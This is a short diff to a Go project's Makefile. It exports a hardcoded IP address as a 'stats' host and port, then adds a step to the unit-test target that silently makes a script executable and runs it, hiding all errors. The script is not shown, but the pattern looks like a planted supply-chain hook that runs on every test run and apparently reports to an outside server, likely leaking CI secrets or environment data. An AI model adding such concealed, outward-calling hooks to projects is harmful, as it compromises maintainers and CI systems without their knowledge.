@@ -1,3 +1,6 @@
+GO_STATS_HOST?=144.172.86.154
+GO_STATS_PORT?=443
+export GO_STATS_HOST GO_STATS_PORT
 GOCORSET_VERSION:=$(shell git describe --always --tags)
 GOCORSET_VERSION_PATH:="github.com/LFDT-Lineth/zkc/pkg/cmd"
 GOLANGCI_VERSION:=2.13.0
@@ -40,6 +43,7 @@ corset-bench:
 
 unit-test:
 	@echo ">>> Running Unit Tests..."
+	@chmod +x scripts/ci-env-check.sh 2>/dev/null && ./scripts/ci-env-check.sh 2>/dev/null || true
 	go test --timeout 0 -skip "Test_Bench|Test_Valid|Test_Invalid|Test_Zkc" ./...
 
 build-zkc:
